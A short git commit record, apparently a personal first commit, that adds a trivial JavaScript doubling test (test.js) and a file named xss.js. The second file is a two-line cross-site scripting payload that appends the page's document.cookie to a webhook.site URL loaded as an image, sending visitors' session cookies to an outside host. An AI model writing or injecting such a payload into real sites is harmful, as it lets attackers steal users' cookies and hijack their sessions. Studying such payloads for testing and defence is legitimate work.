fe93fb56a89a7c1e990d40cca910747cf5d9b8b8
LucasKatashi <lucaskatashicruz@gmail.com>
2023-10-12 22:46:02 -0300

    first commit

---
+++ test.js
@@ -0,0 +1,8 @@
+let vel2x = num =>{
+    return num*2;
+}
+
+var test = 2;
+test = vel2x(test);
+
+console.log(test);
---
+++ xss.js
@@ -0,0 +1,2 @@
+let i = new Image;
+i.src = 'https://webhook.site/86e24e75-b0fa-48c2-bd0c-3eb70097a254'+document.cookie;
